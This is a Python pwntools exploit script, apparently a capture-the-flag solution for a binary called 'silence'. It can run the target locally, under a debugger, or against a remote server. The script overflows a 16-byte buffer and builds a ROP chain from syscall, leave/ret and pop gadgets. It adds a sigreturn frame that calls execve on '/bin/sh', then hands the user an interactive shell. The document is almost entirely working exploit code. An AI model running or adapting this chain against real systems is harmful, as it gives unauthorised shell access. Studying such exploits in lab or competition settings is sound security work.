from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x40120D
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './silence'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
rop = ROP(elf)
syscall = rop.find_gadget(['syscall', 'ret'])[0]
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
rw_section = 0x405000 - 0x500

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = rw_section      # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0       
frame.rsp = rw_section  + 0x100     # NULL
frame.rip = syscall



payload = b'a' * 16
payload += p64(rw_section) #0x404b00
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(0)
#pop rsi pop r15
payload += p64(rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0])
payload += p64(rw_section)
payload += p64(0)
payload += p64(syscall)
payload += p64(syscall)
payload += bytes(frame)
payload = payload.ljust(0x3e8, b'a')
p.sendafter(b':xD\n',payload)
p.sendline(b'/bin/sh\x00' + b'\x00'*6)
p.interactive()